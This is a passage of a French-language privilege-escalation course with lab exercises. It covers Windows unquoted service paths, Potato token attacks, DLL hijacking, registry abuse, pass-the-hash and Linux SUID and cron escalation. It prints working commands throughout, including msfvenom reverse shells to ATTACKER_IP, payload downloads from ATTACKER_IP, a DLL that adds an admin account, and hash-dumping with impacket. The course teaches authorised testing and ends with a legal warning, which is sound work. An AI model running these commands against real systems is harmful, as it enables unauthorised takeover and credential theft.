Si un attaquant peut écrire dans `C:\Program Files\`, il peut placer `C:\Program Files\Some.exe` qui sera exécuté en premier avec les droits du service.

### 11.2 Identification

```powershell
# Trouver les services avec des chemins non-quotés contenant des espaces
wmic service get name,displayname,pathname,startmode |
  findstr /i "auto" | findstr /i /v "C:\Windows\\" | findstr /i /v """

# Via PowerShell
Get-WmiObject -Class Win32_Service | Where-Object {
    $_.PathName -notmatch '"' -and $_.PathName -match ' '
} | Select-Object Name, PathName, StartMode, State

# Via PowerUp
Get-ServiceUnquoted | Format-List
```

### 11.3 Exploitation

```powershell
# Exemple de service vulnérable :
# Name: VulnService
# PathName: C:\Program Files\Vuln Service\bin\service.exe
# StartMode: Auto
# StartName: LocalSystem

# Vérifier les permissions d'écriture sur les répertoires intermédiaires
icacls "C:\Program Files"
# Si (W) ou (F) pour le groupe courant → exploitable

icacls "C:\Program Files\Vuln Service"

# Créer le binaire malveillant (sur Kali)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe -o service.exe

# Placer le binaire au bon endroit
# Si C:\Program Files est inscriptible :
copy evil.exe "C:\Program Files\Vuln.exe"
# Si C:\Program Files\Vuln Service\ est inscriptible :
copy evil.exe "C:\Program Files\Vuln Service\bin.exe"

# Redémarrer le service (si on a les droits)
sc stop VulnService
sc start VulnService

# Ou si on ne peut pas redémarrer, attendre un reboot
# (si StartMode = Auto)
shutdown /r /t 0   # Si on a les droits
```

---

## 12. Token Impersonation — Potato Attacks

### 12.1 Comprendre les tokens Windows

Un **token d'accès Windows** représente l'identité de sécurité d'un thread ou processus. `SeImpersonatePrivilege` permet à un processus d'emprunter l'identité d'un autre token, notamment SYSTEM.

```
Processus IIS/SQLServer/etc.
  → dispose de SeImpersonatePrivilege
  → peut forcer SYSTEM à se connecter à un pipe nommé
  → récupère le token SYSTEM
  → crée un nouveau processus avec ce token
  → shell SYSTEM
```

### 12.2 Rotten Potato (original, 2016)

Fonctionne sur Windows Server 2016 et versions antérieures. Exploite la COM Elevation et DCOM pour obtenir un token SYSTEM.

```powershell
# Vérifier SeImpersonatePrivilege
whoami /priv | findstr "Impersonate"
# SeImpersonatePrivilege        Enabled

# Utiliser RottenPotato (meterpreter)
# Dans un shell meterpreter :
upload RottenPotato.exe C:\Temp\
execute -cH -f C:\Temp\RottenPotato.exe
# Obtenir le token SYSTEM via impersonate_token "NT AUTHORITY\SYSTEM"
```

### 12.3 Juicy Potato (2018)

Version améliorée de Rotten Potato, plus fiable, compatible Windows 7/8/10/Server.

```powershell
# Prérequis : SeImpersonatePrivilege ou SeAssignPrimaryTokenPrivilege
whoami /priv

# Télécharger JuicyPotato.exe
Invoke-WebRequest -Uri "http://ATTACKER_IP:8000/JuicyPotato.exe" -OutFile "C:\Temp\jp.exe"

# Créer un reverse shell
# Sur l'attaquant :
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe -o shell.exe

# Transférer shell.exe vers C:\Temp\
# Se mettre en écoute
nc -lvnp 4444

# Lancer JuicyPotato
# Il faut un CLSID valide pour la version Windows cible
# Liste : https://github.com/ohpe/juicy-potato/tree/master/CLSID
C:\Temp\jp.exe -l 1337 -p C:\Temp\shell.exe -t * -c {F87B28F1-DA9A-4F35-8EC0-800EFCF26B83}
# -l : port local à écouter
# -p : programme à exécuter
# -t : type de token (*, CreateProcessWithToken, CreateProcessAsUser)
# -c : CLSID COM approprié
```

### 12.4 Hot Potato (2016)

Combine NBNS spoofing, WPAD proxy abuse, et NTLM relay pour obtenir un token SYSTEM.

```
[Cible Windows]
  1. Spoof NBNS pour répondre à "WPAD"
  2. La cible cherche le proxy WPAD → répond avec fausse config
  3. Windows s'authentifie sur notre serveur HTTP via NTLM
  4. On relaie l'auth NTLM vers le service local (Windows Update, etc.)
  5. Obtention d'un token SYSTEM
```

```powershell
# Hot Potato (.NET)
Invoke-WebRequest -Uri "http://ATTACKER_IP:8000/Tater.ps1" -OutFile C:\Temp\Tater.ps1
Import-Module C:\Temp\Tater.ps1

# Lancer avec une commande à exécuter en SYSTEM
Invoke-Tater -Trigger 1 -Command "net localgroup administrators user /add"
```

### 12.5 Sweet Potato / PrintSpoofer (2020+)

Pour les systèmes plus récents où Juicy Potato ne fonctionne plus (Windows 10 1809+, Server 2019+).

```powershell
# PrintSpoofer : exploite le service Print Spooler pour PE via pipe
Invoke-WebRequest -Uri "http://ATTACKER_IP:8000/PrintSpoofer64.exe" -OutFile "C:\Temp\ps.exe"

# Exécuter une commande en SYSTEM
C:\Temp\ps.exe -i -c cmd     # Ouvre cmd interactif en SYSTEM
C:\Temp\ps.exe -c "whoami"   # Exécute une commande

# GodPotato (2023) - fonctionne sur Windows Server 2012-2022
Invoke-WebRequest -Uri "http://ATTACKER_IP:8000/GodPotato.exe" -OutFile "C:\Temp\gp.exe"
C:\Temp\gp.exe -cmd "cmd /c whoami"
C:\Temp\gp.exe -cmd "C:\Temp\shell.exe"
```

| Outil | OS Cible | Prérequis |
|---|---|---|
| Rotten Potato | Win 7, Server 2008-2016 | SeImpersonatePrivilege |
| Juicy Potato | Win 7-10, Server 2008-2016 | SeImpersonatePrivilege + CLSID |
| Hot Potato | Win 7-10 | Accès réseau local |
| PrintSpoofer | Win 10, Server 2019 | SeImpersonatePrivilege |
| GodPotato | Win Server 2012-2022 | SeImpersonatePrivilege |
| Sweet Potato | Win 10 récent | SeImpersonatePrivilege |

---

## 13. DLL Hijacking

### 13.1 Principe

Windows cherche les DLL dans un ordre précis. Si un attaquant peut placer une DLL malveillante dans un répertoire vérifié avant le répertoire légitime, sa DLL sera chargée à la place.

**Ordre de recherche Windows (par défaut) :**

```
1. Répertoire de l'application
2. C:\Windows\System32
3. C:\Windows\System
4. C:\Windows
5. Répertoire courant
6. Répertoires dans %PATH%
```

### 13.2 Identifier les DLL manquantes

```powershell
# Utiliser Procmon (Sysinternals) sur la machine d'analyse
# Filtres dans Procmon :
# Process Name = target_service.exe
# Result = NAME NOT FOUND
# Path ends with .dll

# Identifier les DLL recherchées mais non trouvées dans des répertoires inscriptibles
# Si C:\Program Files\App\ est inscriptible et app.exe cherche missing.dll :
#   Placer une missing.dll malveillante dans ce répertoire

# Vérifier les permissions du répertoire de l'application
icacls "C:\Program Files\VulnApp\"
```

### 13.3 Créer une DLL malveillante

```c
// evil.dll - Template C pour DLL malveillante
#include <windows.h>
#include <stdlib.h>

// Reverse shell ou ajout d'utilisateur admin
void payload() {
    system("net user hacker P@ssw0rd123 /add");
    system("net localgroup administrators hacker /add");
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    switch (fdwReason) {
        case DLL_PROCESS_ATTACH:
            payload();
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE;
}
```

```bash
# Compiler la DLL (depuis Kali avec cross-compilation)
x86_64-w64-mingw32-gcc -shared -o missing.dll evil.c -lws2_32

# Ou avec msfvenom directement
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f dll -o missing.dll
```

```powershell
# Placer la DLL
copy missing.dll "C:\Program Files\VulnApp\missing.dll"

# Redémarrer le service ou attendre qu'il charge la DLL
sc restart VulnService
```

### 13.4 DLL Hijacking avec services

```powershell
# Trouver les services qui chargent des DLL depuis des chemins modifiables
# Vérifier les dépendances d'un service avec Dependency Walker ou :
$service = Get-WmiObject Win32_Service | Where-Object {$_.Name -eq "TargetService"}
$service.PathName

# Si le binaire du service est dans un répertoire inscriptible,
# ou si ce binaire charge une DLL depuis un répertoire inscriptible :
# → DLL Hijacking possible
```

---

## 14. Exploitation du registre Windows

### 14.1 AutoRun Registry Keys

Les clés `Run` et `RunOnce` exécutent des programmes au démarrage.

```powershell
# Lister les autoruns de la machine
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce

# Via PowerUp
Get-ModifiableRegistryAutoRun

# Si une entrée pointe vers un fichier que l'on peut modifier :
# Exemple :
# HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
#     VulnApp    REG_SZ    C:\Vulnerable\app.exe

icacls "C:\Vulnerable\app.exe"
# Si BUILTIN\Users: (M) ou (F) → modifiable

# Remplacer par un binaire malveillant
copy evil.exe "C:\Vulnerable\app.exe"
# Au prochain démarrage → exécuté en SYSTEM (si HKLM) ou en admin (si admin)
```

### 14.2 Permissions de service dans le registre

```powershell
# Vérifier les permissions des clés de registre des services
# Accès à HKLM\SYSTEM\CurrentControlSet\Services\<ServiceName>
# Si on peut modifier la clé ImagePath → le service exécute notre binaire

# AccessChk (Sysinternals) pour vérifier les ACL de registre
accesschk.exe -kvuqsw hklm\System\CurrentControlSet\services 2>nul | findstr /i "everyone\|NT AUTHORITY\Authenticated Users\|BUILTIN\Users"

# PowerShell natif
$acl = Get-Acl "HKLM:\SYSTEM\CurrentControlSet\Services\VulnService"
$acl.Access | Where-Object {$_.IdentityReference -match "Users|Everyone|Authenticated"}

# Si on a le droit FullControl ou SetValue sur la clé ImagePath :
reg add "HKLM\SYSTEM\CurrentControlSet\Services\VulnService" /v ImagePath /t REG_EXPAND_SZ /d "C:\Temp\evil.exe" /f
sc start VulnService
```

---

## 15. Pass-the-Hash et Pass-the-Ticket

> [!info] Introduction seulement
> Ces techniques sont couvertes en détail dans le cours "Mouvement Latéral et Active Directory". On présente ici les bases dans le contexte de la PE.

### 15.1 Pass-the-Hash (PtH)

Windows stocke les mots de passe sous forme de hash NTLM. Sous certaines conditions, on peut s'authentifier directement avec le hash sans connaître le mot de passe en clair.

```bash
# Prérequis : obtenir le hash NTLM d'un compte admin
# Via Mimikatz (local, nécessite admin ou debug privilege) :
# privilege::debug
# sekurlsa::logonpasswords
# → récupère les hashes NTLM des sessions actives

# Avec secretsdump d'Impacket (si on a admin sur la cible)
impacket-secretsdump -u Administrator -p Password123 TARGET_IP

# Résultat :
# Administrator:500:aad3b435b51404eeaad3b435b51404ee:8f4fb1e4e8b0a53e8a0e3e8a0e3e8a0e:::

# Utiliser le hash pour s'authentifier
impacket-psexec -hashes :8f4fb1e4e8b0a53e8a0e3e8a0e3e8a0e Administrator@TARGET_IP

# Autres outils PtH
impacket-wmiexec -hashes :HASH Administrator@TARGET_IP
impacket-smbexec -hashes :HASH Administrator@TARGET_IP
evil-winrm -i TARGET_IP -u Administrator -H HASH
```

### 15.2 Pass-the-Ticket (PtT)

Kerberos utilise des tickets (TGT/TGS) pour l'authentification dans un domaine Active Directory. Voler un ticket permet de s'authentifier en tant que l'utilisateur concerné.

```powershell
# Vérifier les tickets Kerberos en mémoire
klist

# Avec Mimikatz : exporter les tickets
# sekurlsa::tickets /export
# → crée des fichiers .kirbi

# Avec Rubeus :
.\Rubeus.exe triage         # Lister les tickets
.\Rubeus.exe dump           # Exporter les tickets en base64
.\Rubeus.exe ptt /ticket:base64_ticket_ici    # Importer un ticket

# Forger un Golden Ticket (nécessite le hash KRBTGT)
# → Persistance totale dans le domaine AD
# → Couvert en cours AD
```

---

## 16. Méthodologie complète et checklist

### 16.1 Workflow Linux PE

```
ÉTAPE 1 : Situation initiale
  ├── id, whoami, groups
  ├── uname -a, cat /etc/os-release
  └── hostname, ifconfig/ip a

ÉTAPE 2 : Énumération rapide manuelle (5 min)
  ├── sudo -l  → droits sudo immédiats ?
  ├── find / -perm -4000 2>/dev/null  → SUID intéressants ?
  ├── cat /etc/crontab && ls /etc/cron*  → cron jobs root ?
  ├── history, cat ~/.bash_history  → credentials exposés ?
  └── getcap -r / 2>/dev/null  → capabilities ?

ÉTAPE 3 : Énumération automatisée
  └── LinPEAS (noter les sections rouge/jaune)

ÉTAPE 4 : Exploitation par priorité
  ├── sudo misconfiguration (plus simple et direct)
  ├── SUID/capabilities (via GTFOBins)
  ├── Cron jobs (world-writable, PATH hijack)
  ├── Writable /etc/passwd
  ├── LD_PRELOAD
  └── Kernel exploit (en dernier recours)
```

### 16.2 Workflow Windows PE

```
ÉTAPE 1 : Situation initiale
  ├── whoami /all  → utilisateur, groupes, privilèges
  ├── systeminfo   → OS version, hotfixes
  └── net user, net localgroup Administrators

ÉTAPE 2 : Vérifications rapides (5 min)
  ├── Tokens : whoami /priv → SeImpersonatePrivilege ?
  ├── reg query AlwaysInstallElevated ?
  ├── Unquoted service paths ?
  └── Credentials : cmdkey /list, fichiers config

ÉTAPE 3 : Énumération automatisée
  ├── WinPEAS
  └── PowerUp : Invoke-AllChecks

ÉTAPE 4 : Exploitation par priorité
  ├── AlwaysInstallElevated (direct si configuré)
  ├── Potato attacks (si SeImpersonatePrivilege)
  ├── Unquoted service paths
  ├── DLL Hijacking
  ├── Registry exploits
  └── Kernel exploits Windows
```

### 16.3 Checklist Linux PE

```
[ ] id / whoami / groups
[ ] sudo -l → commandes autorisées
[ ] find / -perm -4000 2>/dev/null → SUID
[ ] getcap -r / 2>/dev/null → capabilities
[ ] cat /etc/crontab && ls /etc/cron.d/ → cron jobs
[ ] crontab -l → cron utilisateur
[ ] find / -writable -type f 2>/dev/null | grep -v proc → fichiers inscriptibles
[ ] ls -la /etc/passwd /etc/shadow → permissions sensibles
[ ] history && cat ~/.bash_history → credentials
[ ] env && printenv → variables sensibles
[ ] netstat -tulnp → services locaux intéressants
[ ] ps aux → processus root avec fichiers modifiables
[ ] uname -r → version kernel pour exploits
[ ] cat /etc/fstab → montages NFS (no_root_squash ?)
[ ] find / -name id_rsa 2>/dev/null → clés SSH
[ ] cat /var/mail/* 2>/dev/null → emails avec credentials
[ ] LinPEAS complet
```

### 16.4 Checklist Windows PE

```
[ ] whoami /all → droits et privilèges complets
[ ] systeminfo → version OS, hotfixes manquants
[ ] AlwaysInstallElevated → reg query les deux clés
[ ] Unquoted service paths → Get-ServiceUnquoted
[ ] SeImpersonatePrivilege → Potato attacks
[ ] Services modifiables → Get-ModifiableService
[ ] DLL Hijacking → services avec DLL manquantes
[ ] Registry autoruns → modifiables ?
[ ] Credentials stockés → cmdkey, fichiers config, historique PS
[ ] Scheduled Tasks → tâches avec fichiers modifiables
[ ] WinPEAS complet
[ ] PowerUp : Invoke-AllChecks
[ ] AlwaysInstallElevated MSI exploit si applicable
```

---

## 17. Exercices pratiques

### 17.1 Exercice 1 — SUID Basic (Niveau : Débutant)

**Contexte :** Vous avez un shell en tant que `www-data` sur un serveur Ubuntu 20.04.

**Objectif :** Obtenir un shell root en exploitant un binaire SUID.

```bash
# 1. Identifier les binaires SUID
find / -perm -4000 -type f 2>/dev/null

# 2. Comparer avec GTFOBins
# Chercher chaque binaire trouvé sur https://gtfobins.github.io

# 3. Appliquer l'exploitation appropriée

# Challenge : trouver le flag dans /root/flag.txt
```

**Solution indicative :**

```bash
find / -perm -4000 2>/dev/null | grep -E "vim|python|find|bash|awk|perl"
# Si python3 est SUID :
/usr/bin/python3 -c 'import os; os.execl("/bin/bash", "bash", "-p")'
cat /root/flag.txt
```

### 17.2 Exercice 2 — Cron Job Exploitation (Niveau : Intermédiaire)

**Contexte :** Shell en tant que `user`. Un job cron s'exécute toutes les minutes.

**Setup du lab :**

```bash
# En root, configurer l'environnement vulnérable
echo "* * * * * root /opt/scripts/cleanup.sh" >> /etc/crontab
mkdir -p /opt/scripts
cat << 'EOF' > /opt/scripts/cleanup.sh
#!/bin/bash
find /tmp -mtime +1 -delete
EOF
chmod 777 /opt/scripts/cleanup.sh  # World-writable !
```

**Objectif :** Exploiter le cron job pour obtenir un shell root.

```bash
# Solution
echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /opt/scripts/cleanup.sh
# Attendre 1 minute...
/tmp/rootbash -p
id
# uid=1000(user) gid=1000(user) euid=0(root) groups=1000(user)
```

### 17.3 Exercice 3 — Windows Unquoted Path (Niveau : Intermédiaire)

**Contexte :** Shell Windows avec un utilisateur dans le groupe standard.

```powershell
# Trouver le service vulnérable
Get-WmiObject -Class Win32_Service | Where-Object {
    $_.PathName -notmatch '"' -and
    $_.PathName -match ' ' -and
    $_.StartName -match 'LocalSystem'
} | Select-Object Name, PathName

# Vérifier les permissions de chaque segment du chemin
# Créer le binaire malveillant et le placer
# Redémarrer le service
```

### 17.4 Challenge Final — Multi-step PE

```
Accès initial :
  - Shell web (RCE dans une app PHP)
  - Utilisateur : www-data
  - Système : Ubuntu 20.04

Indices :
  - Il existe un job cron intéressant
  - Un binaire SUID peu commun est présent
  - /etc/passwd a des permissions non standard

Objectif : root.txt dans /root/
```

---

## 18. Ressources et références

### 18.1 Ressources en ligne

| Ressource | URL | Utilisation |
|---|---|---|
| GTFOBins | https://gtfobins.github.io | Exploitation SUID/sudo/capabilities |
| LOLBAS | https://lolbas-project.github.io | Équivalent Windows |
| HackTricks Linux PE | https://book.hacktricks.xyz/linux-hardening/privilege-escalation | Référence complète |
| HackTricks Windows PE | https://book.hacktricks.xyz/windows-hardening/privilege-escalation | Référence complète |
| PayloadsAllTheThings | https://github.com/swisskyrepo/PayloadsAllTheThings | Payloads de référence |
| PEASS-ng | https://github.com/carlospolop/PEASS-ng | LinPEAS + WinPEAS |

### 18.2 Plateformes de pratique

| Plateforme | Description | Niveau |
|---|---|---|
| TryHackMe | Rooms guidées PE Linux/Windows | Débutant → Intermédiaire |
| Hack The Box | Machines réelles, moins guidées | Intermédiaire → Avancé |
| PentesterLab | Exercices ciblés par technique | Débutant → Avancé |
| VulnHub | VMs téléchargeables pour lab local | Tout niveau |
| OffSec Proving Grounds | Lab OSCP-like | Intermédiaire → Avancé |

### 18.3 Connexion avec les autres cours Holberton

- **Cours Réseau** → Exploitation des services locaux découverts via `netstat`
- **Cours Linux avancé** → Comprendre les permissions, setuid, capabilities en profondeur
- **Cours Active Directory** → Pass-the-Hash, Pass-the-Ticket, Golden Ticket
- **Cours Web** → L'accès initial via RCE, LFI, SSRF mène souvent à une PE
- **Cours Forensics** → Identifier des traces de PE dans les logs système

---

> [!tip] Conseil final pour les CTF et labs
> Adoptez une approche méthodique : énumérer d'abord, noter **tout** ce qui semble anormal, puis tester en commençant par les techniques les moins risquées (sudo, SUID) avant les exploits kernel. La PE est rarement complexe sur les CTF — elle teste votre rigueur d'énumération plus que votre connaissance d'exploits obscurs.

> [!warning] Rappel éthique et légal
> Ces techniques doivent être pratiquées **exclusivement** dans des environnements contrôlés et autorisés : VMs personnelles, plateformes CTF, engagements de pentest avec autorisation écrite. En France, l'accès non autorisé à un système informatique est puni par l'article 323-1 du Code Pénal (jusqu'à 3 ans d'emprisonnement et 100 000 € d'amende). En situation professionnelle, exiger systématiquement une **lettre d'autorisation signée** avant tout test.
